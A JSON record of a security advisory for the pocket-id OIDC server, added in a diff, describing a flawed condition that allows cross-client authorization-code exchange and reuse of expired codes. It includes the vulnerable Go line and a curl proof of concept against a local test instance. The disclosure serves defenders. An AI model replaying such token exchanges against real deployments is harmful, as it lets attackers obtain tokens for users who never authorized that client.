@@ -1,0 +1,50 @@
+{
+  "global": null,
+  "id": "GHSA-qh6q-598w-w6m2",
+  "repo": {
+    "cve_id": "CVE-2026-28513",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 8.5,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-863"
+    ],
+    "description": "### Summary\r\n\r\nThe OIDC token endpoint rejects an authorization code only when **both** the client ID is wrong **and** the code is expired. This allows cross-client code exchange and expired code reuse.\r\n\r\n### Details\r\n\r\n`backend/internal/service/oidc_service.go:407`\r\n\r\n```go\r\nif authorizationCodeMetaData.ClientID != input.ClientID && authorizationCodeMetaData.ExpiresAt.ToTime().Before(time.Now()) {\r\n    return CreatedTokens{}, &common.OidcInvalidAuthorizationCodeError{}\r\n}\r\n```\r\n\r\n`&&` should be `||`. Current behavior:\r\n\r\n| Condition | Expected | Actual |\r\n|-----------|----------|--------|\r\n| Wrong client + valid code | Reject | **Accept** |\r\n| Correct client + expired code | Reject | **Accept** |\r\n\r\n### PoC\r\n\r\n**Prerequisite:** pocket-id running with `APP_ENV=test` and `BUILD_TAGS=e2etest`. The test user (Tim Cook) must have authorized both Nextcloud and Immich OIDC clients (i.e., `user_authorized_oidc_clients` records exist for both). The seed data includes an authorization code `auth-code` issued for the Nextcloud client.\r\n\r\n```bash\r\n# 1. Seed test data\r\ncurl -X POST \"http://localhost:1411/api/test/reset?skip-ldap=true\"\r\n\r\n# 2. Exchange Nextcloud's auth code using Immich's credentials\r\ncurl -X POST http://localhost:1411/api/oidc/token \\\r\n  -H \"Content-Type: application/x-www-form-urlencoded\" \\\r\n  -d \"grant_type=authorization_code\" \\\r\n  -d \"code=auth-code\" \\\r\n  -d \"client_id=606c7782-f2b1-49e5-8ea9-26eb1b06d018\" \\\r\n  -d \"client_secret=PYjrE9u4v9GVqXKi52eur0eb2Ci4kc0x\" \\\r\n  -d \"redirect_uri=http://immich/auth/callback\"\r\n# Expected: 400 (wrong client)\r\n# Actual: 200 with tokens - access_token.aud = Immich client ID\r\n```\r\n\r\n**Verified result:** HTTP 200 with tokens. The `access_token` audience is `606c7782-...` (Immich), despite the authorization code being issued for `3654a746-...` (Nextcloud).\r\n\r\n### Impact\r\n\r\nAny OIDC client operator can exchange authorization codes issued for other clients, obtaining tokens for users who never authorized that client. Expired authorization codes can also be reused with the correct client until the 24-hour cleanup job runs.\r\n",
+    "ghsa_id": "GHSA-qh6q-598w-w6m2",
+    "html_url": "https://github.com/pocket-id/pocket-id/security/advisories/GHSA-qh6q-598w-w6m2",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-qh6q-598w-w6m2"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-28513"
+      }
+    ],
+    "published_at": "2026-03-07T17:38:25Z",
+    "references": [],
+    "severity": "high",
+    "summary": "Improper Authorization Code Validation Allows Cross-Client Token Exchange and Expired Code Reuse",
+    "updated_at": "2026-03-07T17:38:25Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/pocket-id/pocket-id/backend"
+        },
+        "patched_versions": "v.2.4.0",
+        "vulnerable_version_range": "<= 2.3.0"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "pocket-id/pocket-id"
+}
